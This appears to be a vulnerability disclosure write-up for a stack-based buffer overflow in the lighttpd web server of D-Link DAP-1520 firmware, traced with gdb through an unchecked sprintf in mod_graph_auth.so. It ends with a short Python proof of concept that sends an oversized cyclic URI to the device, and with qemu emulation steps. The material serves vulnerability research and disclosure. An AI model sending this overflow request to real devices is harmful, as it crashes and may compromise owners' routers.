## Overview

| Firmware Name | Firmware Version         | Download Link                                                |
| ------------- | ------------------------ | ------------------------------------------------------------ |
| DAP-1520      | DAP1520A1_FW110b04beta02 | http://legacyfiles.us.dlink.com/DAP-1520/REVA/FIRMWARE/DAP-1520_REVA_FIRMWARE_1.10B04_BETA02_HOTFIX.zip |

## Analysis

![f617fefb621827568fa9f28eda78fbe](./assets/f617fefb621827568fa9f28eda78fbe.png)the http_response_prepare function is called first .the function calls the plugins_call_handle_uri_clean function.

in lighttpd ,the plugins_call_handle_uri_clean function  calls the handle_uri_clean function.

![0af0b84ed6336479eac93cd9315bfc9](./assets/0af0b84ed6336479eac93cd9315bfc9.png)

it seems not too clear,we can use gdb to trace the process.

![a7e711d656b5dca64c424f0bb3dc14c](./assets/a7e711d656b5dca64c424f0bb3dc14c.png)

we can set a breakpoint at 0x41b898

![e06a504c57812082b1f2cb1124231a0](./assets/e06a504c57812082b1f2cb1124231a0.png)

keep going

<img src="./assets/90a07186d3e7d60b9996c742ca59ccc.png" alt="90a07186d3e7d60b9996c742ca59ccc" style="zoom:75%;" />

here calls the sprintf function

look the lib address

![4a92b06d2ad52667b14ff7ae2297d29](./assets/4a92b06d2ad52667b14ff7ae2297d29.png)

In mod_graph_auth.so file

![903fdc9f710ec8bc8476be2feef01d1](./assets/903fdc9f710ec8bc8476be2feef01d1.png)

e calls the sprintf function and copy the a2+324 to V50

![19a6d83c6a7bb1cab03c4d8084c7bae](./assets/19a6d83c6a7bb1cab03c4d8084c7bae-1743603669873-10.png)

here can lead a stack_base overflow

## POC

```py
import requests
from pwn import *
ip = "127.0.0.1"
port = 80
url = f"http://{ip}:{port}/{cyclic(4000).decode('utf-8')}"
print(requests.get(url).text)
```

## qemu-mipsel-static

```
cd etc/conf.d
sudo rm -f auth.conf
cp auth_base.conf auth.conf
cd ..
cd ..
cd tmp/
mkdir log
cd log/
mkdir lighttpd
cd ..
cd ..
cp $(which qemu-mipsel-static) .
sudo chroot ./ ./qemu-mipsel-static  sbin/lighttpd -D -f etc/lighttpd_base.conf
```

## Vulnerability Verification Screenshot

![49187be4f7ceb68c07de4b06cbcd5e6](./assets/49187be4f7ceb68c07de4b06cbcd5e6.png)

 ![fd5c00ff1efa26940c170127dd8fae8](./assets/fd5c00ff1efa26940c170127dd8fae8.png)